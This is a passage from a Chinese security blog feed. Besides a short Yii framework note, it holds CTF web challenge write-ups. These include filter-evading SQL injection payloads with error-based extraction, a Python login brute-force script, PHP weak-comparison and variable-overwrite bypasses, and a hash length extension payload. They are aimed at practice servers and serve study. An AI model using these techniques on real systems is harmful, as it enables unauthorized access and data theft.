$layout=&#39;布局文件名字&#39;</code></p><p>然后我们在common.php里面去添加<code>&lt;?=$content?&gt;</code><br>下面是我comon.php里面的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="php"><span class="meta">&lt;?</span>=$content<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="视图里面显示视图"><a href="#视图里面显示视图" class="headerlink" title="视图里面显示视图"></a>视图里面显示视图</h3><p>在views文件夹下的hello下面再建立两个文件，一个是index.php一个是about.php 我们要想在index.php里面显示about.php里面的内容的话，需要在index.php里面加上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'about'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们需要往about页面里面传进参数的话，这时候我们需要的是这里的render函数的第二个参数<br>但这第二个参数必须是一个数组，我们可以这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'about'</span>,<span class="keyword">array</span>(<span class="string">'view_hello'</span>=&gt;<span class="string">'Hello about 2'</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们还需要把传进的参数在about页面上显示的话<br>我们要在about页面下添加<br><code>&lt;?=$view_hello?&gt;</code> 直接把数组的键值当成变量名在about页面输出即可</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;  最近准备要基于Yii框架写一个项目，于是准备自学一波，这里记录一下自己的笔记&lt;/p&gt;
    
    </summary>
    
      <category term="编程语言" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="PHP" scheme="0verwatch.top/tags/PHP/"/>
    
      <category term="编程语言" scheme="0verwatch.top/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>WhaleCTF第一期打卡的几个web题目</title>
    <link href="0verwatch.top/2018/04/06/whalectfweb1/"/>
    <id>0verwatch.top/2018/04/06/whalectfweb1/</id>
    <published>2018-04-06T06:59:48.000Z</published>
    <updated>2018-05-20T02:20:57.306Z</updated>
    
    <content type="html"><![CDATA[<p>又发现一个很好的平台尝试做一下<br><a id="more"></a></p><h2 id="真的注入"><a href="#真的注入" class="headerlink" title="真的注入"></a>真的注入</h2><p>先输入’发现有报错，应该存在注入<br>然后尝试<br><code>1&#39; or &#39;1&#39;=&#39;1</code>发现被过滤了<br><!--more--><br>然后继续尝试发现<code>空格，union，or,and</code>被过滤了，当然这里也可以用bp的爆破功能去测试，还是很好用的<br>然后这题还有一个坑就是xss的提示，输入<code>&lt;&gt;</code>发现被过滤，这样我们就能够利用这一点去构造payload<br>而空格我们可以用<code>/**/</code>来绕过<br>下面是我的注入过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/o&lt;&gt;r/**/1=1#</span><br><span class="line">1&apos;/**/o&lt;&gt;rder/**/by/**/3#</span><br><span class="line">-1&apos;/**/un&lt;&gt;ion/**/sel&lt;&gt;ect/**/1,2,3# 发现没有回显，只能尝试报错注入或者盲注了，但盲注写脚本太麻烦我们尝试报错注入</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/database())),1)# 发现数据库，下面就是常规操作了</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/table_name/**/from/**/info&lt;&gt;rmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),0x7e),1)#发现表名flag_0d9a，其实这里也可以用group_concat，没被过滤</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/coulmn_name/**/from/**/info&lt;&gt;rmation_schema.columns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#</span><br><span class="line">这里突然发现column被过滤掉了，只能双写绕过了</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/colcolumnsumn_name/**/from/**/info&lt;&gt;rmation_schema.colcolumnsumns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#发现列名flag</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/flag/**/from/**/flag_0d9a),0x7e),1)# 得到flag</span><br></pre></td></tr></table></figure><p>这一题又再一次复习了用&lt;&gt;还有双写绕过的技巧</p><h2 id="不明觉厉"><a href="#不明觉厉" class="headerlink" title="不明觉厉"></a>不明觉厉</h2><p>查看源码发现有<code>9s81jWjd98YU.php</code><br>查看发现是一个登录框，先要想想有没有注入<br>输入’发现没有过滤并且只有admin一个用户<br>只能用爆破了<br>这里学会了如何用绝对位置获取验证码<br>再次查看源码发现密码范围在(11111, 12111)，并且发现这里的username还有password都是以get方式去提交的<br>写个脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(url)</span>:</span></span><br><span class="line">url = url</span><br><span class="line">Talk = requests.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">11111</span>, <span class="number">12112</span>):</span><br><span class="line">ans = Talk.get(url)</span><br><span class="line">Randcode = ans.content[ans.content.find(<span class="string">'randcode'</span>)+<span class="number">23</span>:ans.content.find(<span class="string">'randcode'</span>)+<span class="number">26</span>]</span><br><span class="line">res = Talk.get(url+<span class="string">'?username=admin&amp;password='</span>+str(i)+<span class="string">'&amp;randcode='</span>+Randcode)</span><br><span class="line"><span class="keyword">print</span> len(res.content)</span><br><span class="line"><span class="keyword">if</span> len(res.content)!=<span class="number">160</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Success! Your password is '</span>+str(i)+<span class="string">'\n'</span></span><br><span class="line"><span class="keyword">print</span> res.content</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">url = <span class="string">'http://daka.whaledu.com/web/web38/9s81jWjd98YU.php'</span></span><br><span class="line">solve(url)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Something Wrong!'</span></span><br></pre></td></tr></table></figure><p>最终得到flag</p><h2 id="等量登录"><a href="#等量登录" class="headerlink" title="等量登录"></a>等量登录</h2><p>首先查看源代码发现<code>index.phps</code><br>发现是代码审计的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>($flag);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一题很简单，利用的是sha函数的漏洞去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure><h2 id="强势替换"><a href="#强势替换" class="headerlink" title="强势替换"></a>强势替换</h2><p>又是一道代码审计的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($vs))&#123;</span><br><span class="line">    $Ff = trim(file_get_contents($fF));</span><br><span class="line">        <span class="keyword">if</span>($vs!=$Ff)&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5($vs) == md5($Ff))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span>.$flag.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="string">"&lt;p&gt;Variable extract!&lt;/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hacker!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>都是很简单的题目利用了extract全局变量覆盖还有file_get_contents函数为协议以及MD5弱类型比较的性质<br>构造payload:<code>?vs=QNKCDZO&amp;fF=php://input</code><br>post数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br></pre></td></tr></table></figure><h2 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h2><p>查看源码没发现任何东西，只能去考虑源码泄露的问题了，试一下index.php~出现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"waht the hell?"</span>;</span><br><span class="line">$flag = <span class="string">"*******"</span>; </span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>]) </span><br><span class="line">&#123; </span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>; </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        $c = <span class="number">0</span>; </span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password)) </span><br><span class="line">                $c += <span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>; </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是一些预备知识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[:graph:]匹配任何可见字符</span><br><span class="line"></span><br><span class="line">[:punct:]匹配任何标点符号</span><br><span class="line"></span><br><span class="line">[:digit:]匹配任何数字</span><br><span class="line"></span><br><span class="line">[:upper:]匹配任何大写字母</span><br><span class="line"></span><br><span class="line">[:lower:]匹配任何小写字母</span><br><span class="line"></span><br><span class="line">+表示一次及以上</span><br><span class="line"></span><br><span class="line">|表示或者</span><br></pre></td></tr></table></figure><p>/^[[:graph:]]{12,}$/匹配12个及以上的可见字符</p><p>/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/匹配标点、数字、大写字母、小写字母中的一个</p><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次<br>于是我们可以利用科学计数法去构造<br><code>password=42.000000e+0</code>或者是<code>420.00000e-1</code></p><h2 id="哈希入侵"><a href="#哈希入侵" class="headerlink" title="哈希入侵"></a>哈希入侵</h2><p>hash长度扩展攻击<br>可以用hashdump也可以用github上的脚本<br>以前的博客有些怎么用就不多说了<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00P%00%00%00%00%00%00%00whaleCTF&amp;hash=aab9a3180e92bd4126d56011b672711f</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;又发现一个很好的平台尝试做一下&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>实验吧 忘记密码了wp</title>
    <link href="0verwatch.top/2018/03/18/shiyanba1wp/"/>
    <id>0verwatch.top/2018/03/18/shiyanba1wp/</id>
    <published>2018-03-18T02:14:47.000Z</published>
    <updated>2018-05-20T07:17:21.719Z</updated>
    
    <content type="html"><![CDATA[<p>这个题一开始给了一个登录框<br>先不管输入东西抓一个包看一下<br><a id="more"></a><br>发现有几样有用的东西<br>第一个是admin对应的邮箱<a href="mailto:`admin@simplexue.com" target="_blank" rel="noopener">`admin@simplexue.com</a><code>第二个是一个Vim。。。。这里就要讲一下一个知识点一、vim备份文件默认情况下使用Vim编程，在修改文件后系统会自动生成一个带</code>~`的备份文件，某些情况下可以对其下载进行查看；</p><p>eg:<br>index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~<br>这里我又想到了文件绕过有时候需要PHP的别名<code>php1，php2，php3，php4，php5，phtml</code>等。。。</p><p>二、vim临时文件<br>vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件 .submit.swp。如果文件正常退出，则此文件自动删除。</p><p>比赛的时候多试几个名字，可能会这样<code>submit.php.swp,submit.swp,.submit.php.swp</code>，因为出题人可能出纰漏</p><p>还有一个可利用的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./step2.php?email=youmail@mail.com&amp;check=???????</span><br></pre></td></tr></table></figure><p>进去看看发现了<code>submit.php</code>，进到这个页面<br>提示我不是admin…<br>就尝试一下几个源码泄露的文件名<br>.submit.php.swp出现了一部分源码<br>关键部分是下面这部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"澶辫触浜嗗憖"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>既然不是admin，我们就想起来刚才有用的条件<br>admin的邮箱。。对应emailAddress变量<br>而token按在代码的意思就是只要token等于0并且满足10位的长度即可。<br>那我们构造<code>token=0000000000</code></p><p>发包即可，我的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0000000000 HTTP/1.1</span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1521036323,1521095482,1521202069,1521267229; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*132367%2CnickName%3A0verWatch; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1521269078; PHPSESSID=7in5h4q423rsfsmv6123rlab84</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个题一开始给了一个登录框&lt;br&gt;先不管输入东西抓一个包看一下&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>记一道代码审计题目</title>
    <link href="0verwatch.top/2018/03/18/phpcheck2/"/>
    <id>0verwatch.top/2018/03/18/phpcheck2/</id>
    <published>2018-03-18T02:13:01.000Z</published>
    <updated>2018-05-20T06:38:08.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个题目好像做了两遍了。。。。从这道题目里面学到的东西还是需要记录一下</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="string">""</span>; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:6c525af4059b4fe7d8c33a.txt"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = <span class="number">0</span>; </span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123; </span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>; </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> 